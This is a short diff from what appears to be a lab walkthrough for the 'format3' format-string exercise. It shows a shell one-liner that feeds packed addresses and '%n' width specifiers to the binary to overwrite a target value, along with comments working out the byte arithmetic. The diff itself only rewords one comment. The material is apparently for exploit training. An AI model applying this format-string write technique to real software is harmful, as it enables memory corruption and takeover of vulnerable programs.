@@ -496,7 +496,7 @@ set SHELL=/bin/bash
 ```bash
   # the target value is 0x01025544 -> \x44\x55\x02\x01
 ./format3 <<< $(echo -en "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08";echo -en '%5$52x%12$n%5$17x%13$n%5$173x%14$n')
-  # write lowest address first, \x44..., then overwrite the later bytes, step = 1 byte.
+  # write lower bytes first, \x44..., then overwrite the higher bytes, step = 1 byte.
   # 0x01 -> 0x101 -> 257
   # 0x02 -> 0x102 -> 258
   # 0x44 -> 0x44 -> 68 + 17 -> 0x55 + 173 -> 0x102, which is 0x02 0x01.
